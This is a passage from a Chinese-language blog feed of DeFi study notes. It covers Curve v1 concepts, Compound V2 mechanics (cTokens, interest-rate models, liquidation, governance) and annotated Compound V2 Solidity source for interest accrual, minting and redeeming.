href="#滑点" class="headerlink" title="滑点"></a>滑点</h2><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806143034748.png" alt="image-20230806143034748"></p><p>举个例子</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806144701434.png" alt="image-20230806144701434"></p><h2 id="无常损失"><a href="#无常损失" class="headerlink" title="无常损失"></a>无常损失</h2><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806143314329.png" alt="image-20230806143314329"></p><p>A越大，在同样的价格变化下，Curve的无常损失越大、滑点越低</p><h2 id="y池"><a href="#y池" class="headerlink" title="y池"></a>y池</h2><ul><li><p><a href="https://yearn.finance/">Yearn</a>是一个收益聚合器。</p></li><li><p>您可能认为Compound并不总是具有最好的贷款利率，您是对的，因此 yToken 会自动将您的稳定币平衡到具有更好利率的协议（Compound、Aave 和 dYdX）。</p></li><li>它是免费且非托管的（与 Curve 一样），但这也是为什么 yPools 被认为风险更大，因为您使用的一系列协议本身可能存在严重漏洞。</li></ul><h2 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h2><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804160248281.png" alt="image-20230804160248281"></p>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Compound V2 theory</title>
      <link href="/2024/04/14/12.DeFi/02.Compound%20V2%20theory/"/>
      <url>/2024/04/14/12.DeFi/02.Compound%20V2%20theory/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound-V2-theory"><a href="#Compound-V2-theory" class="headerlink" title="Compound V2 theory"></a>Compound V2 theory</h1><p>使用Compound的<a href="https://github.com/chen4903/Compound-Example">快速入门</a>，用foundry写测试，包含upgrade, borrow, repay, supply, redeem 和计算流动性</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>Compound定义<ul><li>Compound是运行在以太坊上的数字资产理财和贷款服务平台。</li><li>通过一个开源的、去中心化的Compound协议，自动建立市场化的利率定价，为用户提供类似银行的数字货币存贷业务。</li><li>用户存入对应的数字资产回立即产生收益，也可以通过抵押的方式借出数字资产（需要支付利息，利率根据市场供需水平浮动定价），并且按照以太坊区块产生的时间（也就是大概每15秒结算一次利息）。用户的存款可以随时连本带息的取出</li></ul></li></ul><p>Compound认为大多数用户的数字资产都闲置在交易所和钱包里，没有任何收益，它的使命就是改变这一切。</p><h2 id="一些名词"><a href="#一些名词" class="headerlink" title="一些名词"></a>一些名词</h2><ul><li><p>Supply Balance：存款量，折算为USD为单位</p></li><li><p>Borrow Balance：借款量，折算为USD为单位</p></li><li><p>APY：存款或借款的年利率，为复利利率。</p></li><li><p>Collateral Factor：抵押因子（该币种的最大抵押率），为 <code>借款价值 / 抵押价值</code>。比如你提供了价值 100USDT的Dai进行抵押，你最多只能借到价值83.5USDT的其他数字资产。</p></li><li><p>Earn APR：存款利率，对应Dashboard页面的数据。</p></li><li><p>Borrow APR：借款利率，对应Dashboard页面的数据。</p></li><li><p>Reserve Factor：储备因子（储备率），就是存款中的一部分钱要作为储备金，不对外借出的。</p></li><li><p>Reserves：储备金金额，来源于利息积累的一部分</p></li><li><p>Borrow Cap：借出上限</p></li><li><p>Utilization: 资金利用率</p></li><li><p>标的资产(underlying token)：是我们真正进行借贷的资产，比如 ETH、USDT、USDC、WBTC 等。</p></li><li><p>资产利用率：在货币市场的资金池中，借款金额的占比。资产利用率在于度量资金的使用效率，越高越好，代表资金的效率越高。公式如下：</p><ul><li><script type="math/tex; mode=display">资产利用率={\frac{totalBorrows}{(totalCash+totalBorrows-totalReserves)}}</script></li><li><p>totalCash: 放入智能合约中，但是还没有被借走的标的资产总量</p></li><li><p>totalBorrows: 所有借款人应该偿还的所有标的资产总量（包含本金和利息）</p></li><li><p>totalReserves: 储备金是每个<code>cToken</code>合约中的一个会计条目，代表作为现金留出的历史利息的一部分，可以通过协议的治理提取或转移。</p></li></ul></li><li><p>备用金：Compound 会对每一笔借款的利息收益，按照备用金因子计提一笔备用金，作为平台收益。</p></li></ul><h2 id="compound架构"><a href="#compound架构" class="headerlink" title="compound架构"></a>compound架构</h2><ul><li>放贷人/借款人存入资产到 Compound 智能合约的货币市场。放贷人/借款人存入的资产为底层资产（也称为标的资产）。</li><li>智能合约按照兑换率发放对应底层资产的 Compound 代币 cTokens 到用户账户。这里的 cTokens 可以为 cDAI/cETH/cUSDC/cREP/cSAI/cWBTC/cBAT/cZRX 等。</li><li>放贷人存入资产到 Compound 的货币市场中可以享受放贷利息收益，由 Compound 自动撮合贷款需求。</li><li>借款人超额抵押资产后，可以从货币市场借款。不同于P2P借款，借款人不需要和贷款人协商，只要对应货币市场的流动性足够，由 Compound 智能合约自动撮合。借款利率由 Compound 智能合约根据市场对资金的供需关系实时确定。同一区块内，所有借款人的借款利率都是相同的。</li><li>Compound 按照区块数为单位累积借款人利息。</li><li>Compound 对每一笔借款都会计提准备金。</li><li>放贷人可以随时赎回自己存入的底层资产</li><li>借款人可以随时偿还贷款</li><li>如果借款人抵押资产价值低于清算阀值，Compound 智能合约会自动发起清算操作，以保证用户的资产总额大于借贷总额。</li></ul><p><img src="/2024/04/14/12.DeFi/02.Compound%20V2%20theory/image-20230722010058305-16899592755661.png" alt></p><ul><li>借款人可以抵押 Compound 支持的任何资产，但为了防止借款人付不出利息，借出的总资产必须小于抵押资产的一定数量。</li><li>借款人支付的利息按照每个放贷者的资产比例平均分配给所有的放贷者。</li><li>借款人可以随时还款，还款时依据借款利率与时间，决定总的还款数量。同样，放贷人可以随时连本带利提出 DAI，但前提是智能合约中必须有足够的 DAI，由于备用金机制，几乎不可能有提不出资产的情况。</li></ul><h2 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h2><p>Compound市场，每一个币都有一个池子，并且这个池子只有这一种代币。Compound协议通过算法来决定这个池子里的币借贷利率是多少，这个算法会基于人们对这个币借贷的供需关系自动计算出利率，然后可以进行借款、还款、存款、取款</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>资金池</li><li>基于供需法则，由算法生成利率，无需协商</li><li>完全透明的代币余额信息，记录所有历史利率</li></ul><h2 id="cToken"><a href="#cToken" class="headerlink" title="cToken"></a>cToken</h2><ul><li><p>cToken是我们在 Compound 上存入资产的凭证。取款时就可以用 cToken 换回标的资产</p></li><li><p>所有cToken只有8位小数，而underlying token可能有所不同 </p></li><li><p>每一种标的资产都有对应的一种 cToken，比如，ETH 对应 cETH，USDT 对应 cUSDT，当用户向 Compound 存入 ETH 则会返回 cETH。</p></li><li><p>存入token之后，会得到cToken（比如cDAI），我们的存币本息就体现在账户里增长的从DAI的价值，它是我们在Compound存款和提供流动性的凭证，账户里有了cToken，就会按时收到利息。比如：cETH 的兑换率为 0.02，即 1 个 cETH 可以兑换 0.02 个 ETH。</p></li><li><p>cToken 与标的资产的兑换率会随着时间推移不断上涨，上涨的部分正是用户存入资产所生成的利息。因为cToken的价值会越来越高，因为每一个区块会结算一次利息，然后继续升值</p></li><li><p>cToken也可以转账或交易。cToken和标定Token的兑换比例不是1：1，有一个兑换公式。它是ERC20兼容的代币。总体上来说，借款量越高，cToken和标定资产的兑换比例越高。兑换比例公式如下：</p></li><li><p>放贷人将标的资产存入货币市场时候，平台会按照平台实时兑换率 exchangeRate，将标的兑换为平台的 cToken，此过程称之为铸币（Mint Token）：</p></li><li><script type="math/tex; mode=display">exchangeRate = {\frac{getCash()+totalBorrows()-totalReserves()}{totalSupply()} }</script><ul><li>getCash(): 放入智能合约中，但是还没有被借走的标的资产总量</li><li>totalBorrows(): 所有借款人应该偿还的所有标的资产总量（包含本金和利息）</li><li>totalReserves(): 储备金是每个<code>cToken</code>合约中的一个会计条目，代表作为现金留出的历史利息的一部分，可以通过协议的治理提取或转移。</li><li>totalSupply()：所有放贷人（存款）获得的 cToken 总量</li></ul></li></ul><h2 id="利率"><a href="#利率" class="headerlink" title="利率"></a>利率</h2><ul><li><p>只要借入资产与供应资产的比率发生变化，利率就会在每个区块上更新，也就是平均15秒出一个块，15秒更新一次。利率的数量取决于智能合约的具体实施。具体查看LegacyJumpRateModelV2.sol</p></li><li><p>Interest Rate Model：黑线代表市场的资金利用率（也就是借款需求），绿线代表存币市场的利率，紫线代表借币市场的利率。Compound对不同市场采用不同的利率定价模型</p></li><li><p>Compound的利率模型有两种：直线型和拐点型。</p><ul><li>黑色线：利用率。紫线：借款利率。绿线：存款利率</li><li>借款利率的变化都是线性的，符合公式 <code>y = k * x</code>，而存款利率是根据借款利率计算的</li><li>核心逻辑：本质上是要反映借贷供求关系的一个量化指标，利用率低说明存款的多，但借款的太少，即供给大于需求。这时候就需要鼓励用户多借款少存款，所以借款利率偏低，存款利率也偏低。而利用率高的时候则相反，借款利率和存款利率偏高，就能鼓励大家多存款少借款。</li><li>利用率过高的话，那说明资金池里剩下的钱就比较少了，会面临资金池枯竭的风险。资金池枯竭的话，那存款用户就没资金可取，也没资金可借，这就可能会导致系统性风险了。一般资金使用率在 80% 以内比较安全。</li><li>而为了控制利用率在安全范围内，Compound 大多数抵押品都使用拐点型利率模型。对应合约为 BaseJumpRateModelV2。</li><li>拐点型利率模型其实是是两个直线型利率的合成，在达到临界点前使用一条直接，在达到临界点之后使用另一条斜率更高的直线，只所以这么做是为了保护资金池，防止资金池中的资金被借空。</li></ul></li><li><p>借款利率</p><ul><li><p>直线型借款利率公式</p><ul><li><script type="math/tex; mode=display">借款利率=baseRate+utilizationRate*multiplier</script></li></ul></li><li><p>拐点型借款利率公式</p><ul><li><script type="math/tex; mode=display">借款利率=baseRate+utilizationRate*multiplier+(utilizationRate-kink)*jumpMultiplier</script></li><li><p>baseRate:基础利率。</p></li><li><p>utilizationRate:资产利用率</p></li><li><p>multiplier、jumpMultiplier，为对应的乘数</p></li></ul></li></ul></li><li><p>存款利率</p><ul><li><p>存款利率与借款利率、资产利用率都有关系，公式如下：</p><ul><li><script type="math/tex; mode=display">存款利率=borrowRate*(1-reserveFactor)*utilizationRate</script></li></ul></li><li><p>borrowRate: 借款利率</p></li><li><p>reserveFactor: 备用金因子</p></li><li><p>utilizationRate: 就是资产利用率</p></li></ul></li></ul><p><img src="/2024/04/14/12.DeFi/02.Compound%20V2%20theory/image-20230720233658258-16899592755663.png" alt></p><h2 id="清算"><a href="#清算" class="headerlink" title="清算"></a>清算</h2><ul><li>借款的时候，如果在我们还款前，市场产生波动导致抵押率达到最大抵押率（清算阈值），那么第三方清算人就会介入，替借款人偿还全部或部分借款，然后该清算人就会得到对应价值的抵押物，并额外获得8%的抵押物激励，也就是将抵押物的价格打了8%的折扣计价给清算人</li><li>系统并不保证会发生清算。它提供了激励措施，以便用户（清算人）不断寻找清算机会，以便他们调用清算功能并获得一些钱作为回报。</li></ul><h2 id="质押"><a href="#质押" class="headerlink" title="质押"></a>质押</h2><ul><li><p>抵押因子，每种标的资产都有一个抵押因子，代表用户抵押的资产价值对应可得到的借款的比率，即用来衡量可借额度的。</p></li><li><p>抵押因子取值范围 0-1，当为 0 时，表示该类资产不能作为抵押品去借贷其他资产。一般最高设为 0.75，比如 ETH，假如用户存入了 0.1 个 ETH 并开启作为抵押品，当时的 ETH 价值为 2000 美元，则可借额度为 0.1 <em> 2000 </em> 0.75 = 150 美元，可最多借出价值 150 美元的其他资产。</p></li></ul><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p><img src="/2024/04/14/12.DeFi/02.Compound%20V2%20theory/image-20230721140935499-16899592755665.png" alt></p><ul><li><p>Comptroller是Compound协议的风险管理层；它决定了用户需要维持多少抵押品，以及用户是否可以（以及多少）可以被清算。每次用户与 cToken 交互时，都会要求Comptroller批准或拒绝该交易。</p></li><li><p>可以将 Comptroller 视为提供者和验证者合约，它向用户提供信息cTokens并检查用户是否可以执行给定的交易。</p></li></ul><h2 id="治理"><a href="#治理" class="headerlink" title="治理"></a>治理</h2><p><img src="/2024/04/14/12.DeFi/02.Compound%20V2%20theory/image-20230721143031120-16899592755667.png" alt></p><ul><li><p>一些概念</p><ul><li><p>治理代币COMP，拥有COMP的用户可以参与社区投票，拥有1%以上COMP的地址可以发起提案并开启投票。发行量为1000万，42.3%留给了Compound协议使用。所有参与存贷业务的用户都能够得到COMP激励。Distribution APY是当前市场存贷的挖矿收益率，存贷越多，COMP奖励越多，也就是常说的流动性挖矿。</p></li><li><p>每天在八个借贷市场上分发大概2880个COMP</p></li><li><p>Comproller采用可升级代理模式，实际的proxy合约叫做Unitroller。Unitroller拥有一些方法比如设置实现类、设置Admin等，一般的调用请求都会进入到fallback中然后进行delegate调用。因此这里存在一些安全问题，比如提出一个恶意提案，通过之后，该恶意提案将实现类合约升级为恶意合约。</p></li></ul></li><li><p>三个组件：COMP Token、Governor Alpha、 Timelock。通过治理模块，允许社区提出、投票和实时更提案，提案可以包括调整利率模型、增加对新资产的支持等。</p></li></ul><p>下面给出发起提案、投票、执行的完整流程</p><ol><li><p>发出提案</p><ul><li><p><code>propose()</code>方法位于GovernorBravoDelegate.sol中。发起投票有门槛，需要一定数量的COMP，目前是25000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint)</span><br></pre></td></tr></table></figure><p>一旦提案通过，那么投票会被延迟13,140个区块，大约两天，然后才可以进行投票</p></li></ul></li><li><p>投票</p><ul><li><p>有用COMP的人才可以进行投票，可以将投票权委托给自己，也可也委托给别人。还有其他投票函数，原理也大致相同</p></li><li><p>需要传入提案的ID和选项（0代表反对，1代表支持，2代表弃权）</p></li><li><p>目前投票期持续19,710个区块（约3天），投票期结束后，就该对提案进行排队了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function castVote(uint proposalId, uint8 support) externalt</span><br></pre></td></tr></table></figure></li></ul></li><li><p>队列</p><ul><li>一旦收集到所有选票并且投票期结束，该提案要么“成功”，要么“失败”。如果提案成功，那么下一步就可以进行。</li><li>提案成功必须满足：（1）赞成票大于反对票，（2）赞成票大于quorumVotes，目前quorumVotes=400，000</li><li>一旦交易被排队到 Timelock 合约中，就会有 172,800 秒的延迟（2 天）。一旦延迟结束，交易就可以执行。</li></ul></li><li><p>执行</p><ul><li>这只需从 GovernorBravoDelegate.sol 中调用<code>execute()</code>交易即可完成。该函数将从 Timelock.sol的上下文中执行提案。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.Compound V2 code</title>
      <link href="/2024/04/14/12.DeFi/03.Compound%20V2%20code/"/>
      <url>/2024/04/14/12.DeFi/03.Compound%20V2%20code/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound-V2-code"><a href="#Compound-V2-code" class="headerlink" title="Compound V2 code"></a>Compound V2 code</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>四大模块：</p><ul><li>核心合约：cToken合约是主要业务逻辑的合约，存款取款、借款还款等逻辑都在里面。CToken合约引入了 InterestRateModel 合约和 Comptroller 合约，因此先阅读改相关合约</li><li>利率模型：利率模型的抽象合约，JInterestRateModel、umpRateModelV2、JumpRateModel、WhitePaperInterestRateModel 都是具体的利率模型实现。</li><li>审计合约：审计两个字看起来很高大上，其实只是封装了一些业务检验功能，比如存款取款、借款还款前进行校验、开启抵押品等操作。</li><li>治理合约：包含治理合约和治理代币Comp合约，Openzepplin也有相关实现。治理这个词也很高大上的样子，简单来说就是拥有一定量Comp代币的人可以发起提案，这些提案一般就是改改参数啥的，比如抵押因子、储备因子。</li></ul><p><img src="https://moe.photo/images/2023/08/01/image-20230801162305249.png" alt></p><h2 id="核心合约"><a href="#核心合约" class="headerlink" title="核心合约"></a>核心合约</h2><ul><li><p>CToken</p><ul><li><p>继承了CTokenInterface、ExponentialNoError、TokenErrorReporter，后两个用于处理定点十进制数和错误报告相关，和业务逻辑无关。而第一个定义了大量待实现的方法（管理、用户操作、管理员操作、货币市场等），并且又继承了CTokenStorage，CTokenStorage只定义了成员变量。这样实现了数据和逻辑的分离，从而保证CToken合约可以升级。当使用代理模式，用户对目标合约的所有调用都会通过Proxy合约，然后Proxy合约会delegate到逻辑合约.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abstract contract CToken is CTokenInterface, ExponentialNoError, TokenErrorReporter &#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>CToken</code> 是一个抽象的基础合约，没有构造函数，所以不能被部署，只能被别的合约继承，继承这个合约的正是 <code>CErc20</code> 和 <code>CEther</code>。</p></li></ul></li><li><p>CEther&amp;CErc20</p><ul><li><p><code>CEther</code> 用来作为cETH，它有构造函数，所以可以被部署在链上，正是用户交互的入口合约之一，而 <code>CErc20</code> 用来处理基于 ERC20 标准的其他代币（比如cDAI, cUSDT），但是这个合约没有提供构造函数，只有一个初始化函数，说明它是不可以被部署的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract CErc20 is CToken, CErc20Interface &#123;&#125;</span><br><span class="line"></span><br><span class="line">contract CEther is CToken &#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>CErc20Delegate&amp;CErc20Delegator</p><ul><li><p>那么如何部署 <code>CErc20</code> 合约呢，答案正是代理模式。</p></li><li><p>与 <code>CErc20</code> 相关的合约还有两个，分别是 <code>CErc20Delegate</code> 和 <code>CErc20Delegator</code>。<code>CErc20Delegator</code> 是Proxy Contract，而 <code>CErc20Delegate</code> 是 Logic Contract，这两个合约都是可以部署的，<code>CErc20Delegator</code> 也是用户交互的另一个入口合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract CErc20Delegate is CErc20, CDelegateInterface &#123;&#125;</span><br><span class="line"></span><br><span class="line">contract CErc20Delegator is CTokenInterface, CErc20Interface, CDelegatorInterface &#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="CToken-sol"><a href="#CToken-sol" class="headerlink" title="CToken.sol"></a>CToken.sol</h3><h4 id="存款"><a href="#存款" class="headerlink" title="存款"></a>存款</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//@notice Sender supplies assets into the market and receives cTokens in </span><br><span class="line">   function mintInternal(uint mintAmount) internal nonReentrant &#123;</span><br><span class="line">       accrueInterest(); // 计算新利润</span><br><span class="line">       mintFresh(msg.sender, mintAmount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>accrueInterest()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">  /**</span><br><span class="line">   * @notice Applies accrued interest to total borrows and reserves</span><br><span class="line">   * @dev This calculates interest accrued from the last checkpointed block</span><br><span class="line">   *   up to the current block and writes new checkpoint to storage.</span><br><span class="line">   */</span><br><span class="line">  function accrueInterest() virtual override public returns (uint) &#123;</span><br><span class="line">      // 获取当前区块 currentBlockNumber 和上一次计算的区块 accrualBlockNumberPrior</span><br><span class="line">      uint currentBlockNumber = getBlockNumber();</span><br><span class="line">      uint accrualBlockNumberPrior = accrualBlockNumber;</span><br><span class="line"></span><br><span class="line">      // 如果两个区块相等，则表示当前去看已经计算过利息，无需再计算，直接返回</span><br><span class="line">      if (accrualBlockNumberPrior == currentBlockNumber) &#123;</span><br><span class="line">          return NO_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      uint cashPrior = getCashPrior(); // 资金池余额</span><br><span class="line">      uint borrowsPrior = totalBorrows; // 总借款</span><br><span class="line">      uint reservesPrior = totalReserves; // 总储备金</span><br><span class="line">      uint borrowIndexPrior = borrowIndex; // 借款指数</span><br><span class="line"></span><br><span class="line">      // 计算：获取当前的借款利率。</span><br><span class="line">      uint borrowRateMantissa = interestRateModel.getBorrowRate(cashPrior, borrowsPrior, reservesPrior);</span><br><span class="line">      // 当前借款利率不得超过最大利率，最大的借款利率当前设置为 0.0005e16，即每区块 0.0005%</span><br><span class="line">      require(borrowRateMantissa &lt;= borrowRateMaxMantissa, &quot;borrow rate is absurdly high&quot;);</span><br><span class="line"></span><br><span class="line">      // 计算从上次计算之后到当前经过的区块数量。该区块数量表示还未计算利息的区块区间。</span><br><span class="line">      uint blockDelta = currentBlockNumber - accrualBlockNumberPrior;</span><br><span class="line"></span><br><span class="line">// 然后下面是一系列计算</span><br><span class="line">// 1.计算区块数量时间应收的利息率（因子）：  利息因子   = 当前借款利率 * 累计未计算区块间隔。</span><br><span class="line">      //                            simpleInterestFactor  = borrowRate  * blockDelta </span><br><span class="line">      // 2.计算应计利息：应计利息  = 利息因子              *  当前借款总额。</span><br><span class="line">      //     interestAccumulated = simpleInterestFactor * totalBorrows</span><br><span class="line">      // 3.计算借款总额：借款总额 = 应计利息             +  当前借款总额</span><br><span class="line">      //        totalBorrowsNew = interestAccumulated + totalBorrows </span><br><span class="line">      // 4.计算储备金总额：储备金总额 =     储备因子         * 应计利息       + 当前的储备金总额。</span><br><span class="line">      //           totalReservesNew = interestAccumulated * reserveFactor + totalReserves</span><br><span class="line">      // 5.计算借款指数：借款指数 =        利息因子        * 当前借款指数  + 当前借款指数.</span><br><span class="line">      //         borrowIndexNew = simpleInterestFactor   * borrowIndex + borrowIndex</span><br><span class="line">      Exp memory simpleInterestFactor = mul_(Exp(&#123;mantissa: borrowRateMantissa&#125;), blockDelta);</span><br><span class="line">      uint interestAccumulated = mul_ScalarTruncate(simpleInterestFactor, borrowsPrior);</span><br><span class="line">      uint totalBorrowsNew = interestAccumulated + borrowsPrior;</span><br><span class="line">      uint totalReservesNew = mul_ScalarTruncateAddUInt(Exp(&#123;mantissa: reserveFactorMantissa&#125;), interestAccumulated, reservesPrior);</span><br><span class="line">      uint borrowIndexNew = mul_ScalarTruncateAddUInt(simpleInterestFactor, borrowIndexPrior, borrowIndexPrior);</span><br><span class="line"></span><br><span class="line">      // 更新当前区块高度、借款指数、借款总额、储备金总额。</span><br><span class="line">      accrualBlockNumber = currentBlockNumber;</span><br><span class="line">      borrowIndex = borrowIndexNew;</span><br><span class="line">      totalBorrows = totalBorrowsNew;</span><br><span class="line">      totalReserves = totalReservesNew;</span><br><span class="line"></span><br><span class="line">      emit AccrueInterest(cashPrior, interestAccumulated, borrowIndexNew, totalBorrowsNew);</span><br><span class="line"></span><br><span class="line">      return NO_ERROR;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>mintFresh()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  // @notice User supplies assets into the market and receives cTokens in </span><br><span class="line">  function mintFresh(address minter, uint mintAmount) internal &#123;</span><br><span class="line">      // 检查是否允许当前地址存入指定数量的 ETH。如果不允许，则抛出异常。</span><br><span class="line">      uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);</span><br><span class="line">      if (allowed != 0) &#123;</span><br><span class="line">          revert MintComptrollerRejection(allowed);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 验证当前区块高度是否等于市场保存的区块高度。如果不一致则抛出异常。</span><br><span class="line">      if (accrualBlockNumber != getBlockNumber()) &#123;</span><br><span class="line">          revert MintFreshnessCheck();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 计算当前的汇率</span><br><span class="line">// exchangeRateStoredInternal 函数：首先检查当前总的供给量是否为0，</span><br><span class="line">// 如果是返回初始的兑换率，否则使用 (totalCash + totalBorrows - totalReserves) / totalSupply 计算新的的兑换率。</span><br><span class="line">      Exp memory exchangeRate = Exp(&#123;mantissa: exchangeRateStoredInternal()&#125;);</span><br><span class="line"></span><br><span class="line">       // 计算发起者实际转入到合约中的 Token 数量。</span><br><span class="line">      uint actualMintAmount = doTransferIn(minter, mintAmount);</span><br><span class="line"></span><br><span class="line">// 根据汇率计算获得的 cToken 数量</span><br><span class="line">// 铸造的 cToken 数量等于真实输入到合约中的 Token 数量除以兑换率，</span><br><span class="line">// 公式如下：mintTokens = actualMintAmount / exchangeRate。</span><br><span class="line">      uint mintTokens = div_(actualMintAmount, exchangeRate);</span><br><span class="line"></span><br><span class="line">      // 计算 cToken totalSupply；写入用户的余额</span><br><span class="line">      totalSupply = totalSupply + mintTokens;</span><br><span class="line">      accountTokens[minter] = accountTokens[minter] + mintTokens;</span><br><span class="line"></span><br><span class="line">      emit Mint(minter, actualMintAmount, mintTokens);</span><br><span class="line">      emit Transfer(address(this), minter, mintTokens);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>因此，存款操作的大概就是将抵押品转入合约，根据利率获取一定量的cToken。</p><h4 id="取款"><a href="#取款" class="headerlink" title="取款"></a>取款</h4><p><code>redeemInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function redeemInternal(uint redeemTokens) internal nonReentrant &#123;</span><br><span class="line">    accrueInterest(); // 计算利息</span><br><span class="line">    // redeemFresh emits redeem-specific logs on errors, so we don&#x27;t need to</span><br><span class="line">    redeemFresh(payable(msg.sender), redeemTokens, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>redeemFresh()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// @notice User redeems cTokens in exchange for the underlying asset</span><br><span class="line">// uint redeemTokensIn 和 uint redeemAmountIn 参数，意思你可以给定抵押品量或者给定cToken量来进行取款。二者必须有一个是0</span><br><span class="line">   function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal &#123;</span><br><span class="line">       require(redeemTokensIn == 0 || redeemAmountIn == 0, &quot;one of redeemTokensIn or redeemAmountIn must be zero&quot;);</span><br><span class="line"></span><br><span class="line">       // 计算当前的兑换率</span><br><span class="line">       Exp memory exchangeRate = Exp(&#123;mantissa: exchangeRateStoredInternal() &#125;);</span><br><span class="line"></span><br><span class="line">       uint redeemTokens;</span><br><span class="line">       uint redeemAmount;</span><br><span class="line">       // 如果是给定cToken量来计算</span><br><span class="line">       if (redeemTokensIn &gt; 0) &#123;</span><br><span class="line">           redeemTokens = 